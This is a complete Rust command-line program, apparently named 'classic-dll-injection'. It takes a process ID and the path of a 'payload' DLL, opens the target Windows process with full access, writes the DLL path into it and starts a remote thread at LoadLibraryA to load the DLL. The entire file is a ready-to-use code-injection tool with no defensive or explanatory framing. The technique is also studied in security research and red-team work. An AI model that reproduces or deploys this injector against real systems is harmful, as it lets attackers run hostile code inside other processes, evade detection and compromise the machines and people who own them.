use std::ffi::CString;
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{CloseHandle, FALSE, HANDLE},
        System::{
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            Memory::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE, VirtualAllocEx, VirtualFreeEx},
            Threading::{
                CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE,
                PROCESS_ALL_ACCESS,
            },
        },
    },
};

fn inject_dll(pid: u32, dll_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Build a null-terminated path byte slice including the null terminator.
    let dll_path_cstring = CString::new(dll_path)?;
    let dll_bytes = dll_path_cstring.as_bytes_with_nul();
    let dll_len = dll_bytes.len();

    // Open the target process with full access.
    let h_process: HANDLE = unsafe {
        OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
            .map_err(|e| format!("OpenProcess failed: {:?}", e))?
    };

    // Allocate memory in the remote process for the DLL path string.
    let remote_buf = unsafe {
        VirtualAllocEx(h_process, None, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };
    if remote_buf.is_null() {
        unsafe { let _ = CloseHandle(h_process); }
        return Err("VirtualAllocEx failed: returned null".into());
    }

    // Write the DLL path into the remote process memory.
    let mut bytes_written: usize = 0;
    let write_ok = unsafe {
        windows::Win32::System::Diagnostics::Debug::WriteProcessMemory(
            h_process,
            remote_buf,
            dll_bytes.as_ptr() as *const _,
            dll_len,
            Some(&mut bytes_written),
        )
    };
    if write_ok.is_err() {
        unsafe {
            let _ = VirtualFreeEx(h_process, remote_buf, 0, MEM_RELEASE);
            let _ = CloseHandle(h_process);
        }
        return Err(format!("WriteProcessMemory failed: {:?}", write_ok).into());
    }

    // Resolve LoadLibraryA from kernel32.dll in the local process.
    // Because kernel32.dll is always mapped at the same base across processes on the
    // same system session, the local address is valid as a remote thread start address.
    let kernel32 = unsafe {
        GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr()))
            .map_err(|e| format!("GetModuleHandleA failed: {:?}", e))?
    };
    let load_library_a = unsafe {
        GetProcAddress(kernel32, PCSTR(b"LoadLibraryA\0".as_ptr()))
            .ok_or("GetProcAddress(LoadLibraryA) returned null")?
    };

    // Cast the function pointer to the LPTHREAD_START_ROUTINE signature expected by
    // CreateRemoteThread (both are `unsafe extern "system" fn(*mut c_void) -> u32`).
    let thread_start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
        unsafe { std::mem::transmute(load_library_a) };

    // Launch LoadLibraryA in the remote process, passing the remote buffer as argument.
    let h_thread = unsafe {
        CreateRemoteThread(
            h_process,
            None,
            0,
            Some(thread_start),
            Some(remote_buf),
            0,
            None,
        )
        .map_err(|e| format!("CreateRemoteThread failed: {:?}", e))?
    };

    // Wait for the remote thread to finish loading the DLL.
    unsafe { WaitForSingleObject(h_thread, INFINITE) };

    // Clean up.
    unsafe {
        let _ = VirtualFreeEx(h_process, remote_buf, 0, MEM_RELEASE);
        let _ = CloseHandle(h_thread);
        let _ = CloseHandle(h_process);
    }

    println!("[+] DLL injected successfully into PID {}", pid);
    Ok(())
}

fn main() {
    let args: Vec<String> = std::env::args().collect();

    let mut pid: Option<u32> = None;
    let mut dll: Option<String> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--pid" => {
                i += 1;
                pid = Some(
                    args.get(i)
                        .expect("--pid requires a value")
                        .parse()
                        .expect("--pid must be a numeric process ID"),
                );
            }
            "--dll" => {
                i += 1;
                dll = Some(
                    args.get(i)
                        .expect("--dll requires a value")
                        .to_string(),
                );
            }
            _ => {}
        }
        i += 1;
    }

    let pid = pid.unwrap_or_else(|| {
        eprintln!("Usage: classic-dll-injection --pid <PID> --dll <path\\to\\payload.dll>");
        std::process::exit(1);
    });
    let dll = dll.unwrap_or_else(|| {
        eprintln!("Usage: classic-dll-injection --pid <PID> --dll <path\\to\\payload.dll>");
        std::process::exit(1);
    });

    if let Err(e) = inject_dll(pid, &dll) {
        eprintln!("[-] Injection failed: {}", e);
        std::process::exit(1);
    }
}
